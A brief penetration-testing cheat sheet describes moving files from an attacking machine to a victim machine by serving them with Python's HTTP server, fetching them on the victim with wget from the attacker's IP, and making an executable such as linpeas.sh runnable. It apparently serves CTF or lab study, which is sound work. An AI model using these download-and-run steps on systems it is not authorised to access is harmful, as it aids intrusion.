**Attacking machine:**
Navigate to the file location
`python -m SimpleHTTPServer 8080`
or
`python3 -m http.server 9000`

**Victim machine:**
Navigate to where you want the file to go
`wget <attacking IP address>:8080/<filename>`

If it’s an executable e.g. linpeas.sh
`chmod +x <filename>`
